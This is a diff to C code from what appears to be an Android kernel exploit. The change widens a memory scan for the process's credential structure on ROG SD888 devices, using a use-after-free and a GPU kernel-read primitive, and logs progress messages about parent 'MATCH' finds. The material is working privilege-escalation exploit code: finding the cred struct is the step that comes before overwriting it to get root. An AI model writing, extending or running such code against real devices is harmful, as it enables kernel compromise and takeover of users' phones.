@@ -2089,29 +2089,48 @@ static int scan_uaf_for_nonzero_multi(int fd, struct nonzero_page *found_pages, 
                             }
 
                             if (!c_ptr) {
-                                // Fallback: Scan all pointers
-                                for (int off = c_off - 4000; off < c_off + 1000; off += 8) {
+                                // Fallback: Scan all pointers - EXPANDED for ROG
+                                // On SD888, cred structure may be larger, search wider range
+                                fprintf(stderr, "      [P] [*] Expanding search for ROG SD888 layout...\n");
+                                
+                                for (int off = c_off - 6000; off < c_off + 4000; off += 8) {
                                     if (off < 0 || off > 16384 - 8) continue;
                                     uint64_t p = *(uint64_t *)(big_data + off);
                                     if ((p & 0xffffff0000000000ULL) == 0xffffff0000000000ULL) {
                                         p_cand++;
-                                        uint8_t cc[256];
-                                        if (gpu_read_task_struct(fd, p, cc, 256) == 0) {
+                                        // Try larger read - cred may be up to 512 bytes on some kernels
+                                        uint8_t cc[512];
+                                        if (gpu_read_task_struct(fd, p, cc, 512) == 0) {
                                             int uid_count = 0;
-                                            for (int co = 0; co < 240; co += 4) {
-                                                if (*(uint32_t *)(cc + co) == my_uid) {
+                                            int first_uid_offset = -1;
+                                            // Search full 512 bytes for ROG
+                                            for (int co = 0; co < 504; co += 4) {
+                                                uint32_t val = *(uint32_t *)(cc + co);
+                                                if (val == my_uid) {
+                                                    if (first_uid_offset == -1) first_uid_offset = co;
                                                     uid_count++;
                                                     if (uid_count >= 2) { // Stronger match
                                                         c_ptr = p;
-                                                        fprintf(stderr, "      [P] [!!!] Parent found MATCH via scan! ptr=0x%lx (UID at +0x%x, count %d)\n", 
-                                                                (unsigned long)c_ptr, co, uid_count);
+                                                        fprintf(stderr, "      [P] [!!!] Parent found MATCH via ROG scan! ptr=0x%lx (UID at +0x%x, +0x%x, count %d)\n", 
+                                                                (unsigned long)c_ptr, first_uid_offset, co, uid_count);
                                                         break;
                                                     }
                                                 }
                                             }
                                             if (c_ptr) break;
+                                            
+                                            // Debug: if we found single UID but not double, print it
+                                            if (uid_count == 1 && first_uid_offset >= 0) {
+                                                fprintf(stderr, "      [P] [?] Single UID match at ptr=0x%lx offset +0x%x (need 2 matches)\n",
+                                                        (unsigned long)p, first_uid_offset);
+                                            }
                                         }
                                     }
+                                }
+                                
+                                if (!c_ptr) {
+                                    fprintf(stderr, "      [P] [!] ROG scan complete: checked %d candidates, UID pattern not found.\n", p_cand);
+                                    fprintf(stderr, "      [P] [!] This may indicate non-standard cred layout on this ROG kernel.\n");
                                 }
                             }
                             if (c_ptr) {
